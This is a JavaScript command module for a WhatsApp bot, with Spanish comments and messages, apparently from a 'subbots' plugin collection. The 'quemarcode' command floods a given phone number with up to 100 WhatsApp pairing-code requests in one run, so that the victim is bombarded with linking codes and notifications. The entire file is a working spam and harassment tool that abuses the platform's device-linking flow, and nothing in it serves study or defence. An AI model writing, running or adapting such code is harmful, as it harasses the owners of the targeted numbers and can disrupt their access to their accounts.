// @nombre: quemarcode
// @alias: burncode, spamcode, quemar
// @categoria: subbots
// @descripcion: Realiza múltiples intentos de vinculación para un número (Pairing Code Spam).
// @reaccion: 🔥

import { makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, delay } from '@itsukichann/baileys';
import pino from 'pino';
import fs from 'fs';
import path from 'path';

export default async function(m, { conn, args, reply, isOwner }) {
  // Solo el dueño puede usar este comando por seguirdad y evitar abusos pesados
  if (!isOwner) return reply('❌ *Aww...* Solo el dueño del bot puede usar este comando tan potente. 🔥');

  const number = args[0]?.replace(/[^0-9]/g, '');
  if (!number || number.length < 10) return reply('❌ *Error:* Ingresa un número válido con código de país.\nEj: `/quemarcode 5493816666666`');

  const iterations = parseInt(args[1]) || 20;
  if (iterations > 100) return reply('⚠️ *Cuidado:* Máximo 100 intentos por ejecución.');

  await reply(`🔥 *¡Iniciando modo Quema!* Solicitando ${iterations} códigos para +${number}...\n🚀 _Espera un momento, esto puede tomar tiempo._`);

  const tmpPath = path.resolve(`./tmp/burn_${number}`);
  if (!fs.existsSync(tmpPath)) fs.mkdirSync(tmpPath, { recursive: true });

  for (let i = 0; i < iterations; i++) {
    try {
      const { state, saveCreds } = await useMultiFileAuthState(tmpPath);
      const sock = makeWASocket({
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
        },
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false
      });

      // Intentar pedir el código
      if (!sock.authState.creds.registered) {
        // Le damos un poco de tiempo para establecer el handshake inicial (WebSocket start)
        await delay(1500);
        
        // Pedimos el pairing code y ESPERAMOS a que WhatsApp nos lo devuelva.
        // Si no esperamos esto, cerramos el socket antes de que WhatsApp envíe el SMS/Notificación.
        const code = await sock.requestPairingCode(number);
        console.log(`[BURN] Envío exitoso. Código: ${code}`);
        await delay(500); // Breve espera antes de cerrar
      }

      // Cerrar y limpiar sockets/listeners
      sock.ev.removeAllListeners();
      if (sock.ws) sock.ws.close();
      
    } catch (err) {
      console.log(`[BURN] Error en intento ${i+1}: ${err.message}`);
    }
    
    // Feedback visual opcional cada 10 intentos
    if ((i + 1) % 10 === 0) {
      console.log(`[BURN] ${i + 1} códigos enviados a ${number}`);
    }
  }

  // Limpiar carpeta temporal al terminar
  try {
    fs.rmSync(tmpPath, { recursive: true, force: true });
  } catch (e) {}

  await reply(`✅ *Quema finalizada:* Se enviaron ${iterations} solicitudes de vinculación a +${number}. 🔥✨`);
}
